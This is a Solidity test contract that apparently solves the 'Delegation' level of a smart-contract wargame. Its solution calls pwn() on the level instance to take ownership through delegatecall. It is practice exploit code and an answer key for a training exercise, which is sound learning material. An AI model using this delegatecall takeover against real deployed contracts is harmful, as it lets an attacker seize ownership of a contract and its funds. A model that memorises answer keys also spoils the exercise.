// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {DelegationFactory} from "../src/levels/06-DelegationFactory.sol";
import {Delegation, Delegate} from "../src/levels/06-Delegation.sol";

contract DelegationSolution is BaseTest {

    function solution(address payable target) internal override{
        Delegate(target).pwn();
    }

    function construction() internal override returns(address payable ) {
        return payable(address(new DelegationFactory()));
    }
}
